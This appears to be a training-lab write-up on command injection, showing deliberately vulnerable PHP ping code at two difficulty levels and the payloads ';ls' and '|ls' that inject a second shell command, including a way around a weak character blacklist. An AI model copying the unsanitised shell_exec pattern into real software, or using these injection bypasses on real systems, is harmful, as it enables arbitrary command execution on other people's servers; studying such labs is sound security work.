# Command Execution

## Low

```php
<?php
if( isset( $_POST[ 'submit' ] ) ) {
    $target = $_REQUEST[ 'ip' ];

    // Determine OS and execute the ping command.
    if (stristr(php_uname('s'), 'Windows NT')) { 
        $cmd = shell_exec( 'ping  ' . $target );
        echo '<pre>'.$cmd.'</pre>';
    } else { 
        $cmd = shell_exec( 'ping  -c 3 ' . $target );
        echo '<pre>'.$cmd.'</pre>';   
    } 
}
?> 
```

This is fairly straight forward, and a classic example of unsanitised input being used in a sensitive context. The `$target` variable is taken straight from a request parameter, and inserted into a `shell_exec` command.

Since there is no sanitisation to evade, we can just insert our payload.

*Input:*
```
;ls
```

*Output:*
```
help
index.php
source
```

## Medium

```php
<?php
if( isset( $_POST[ 'submit'] ) ) {
    $target = $_REQUEST[ 'ip' ];

    // Remove any of the charactars in the array (blacklist).
    $substitutions = array(
        '&&' => '',
        ';' => '',
    );

    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );
    
    // Determine OS and execute the ping command.
    if (stristr(php_uname('s'), 'Windows NT')) { 
        $cmd = shell_exec( 'ping  ' . $target );
        echo '<pre>'.$cmd.'</pre>';  
    } else { 
        $cmd = shell_exec( 'ping  -c 3 ' . $target );
        echo '<pre>'.$cmd.'</pre>';  
    }
}
?> 
```

They've wised up a little now, and will no longer allow us to use `&&` or `;` to separate commands. Howevever, we can still use `|` to get our command in! Ordinarily, this would take the output of `ping` and use it as the input of our command. Any command that does not take input this way will work fine.

*Input:*
```
|ls
```

*Output:*
```
help
index.php
source
```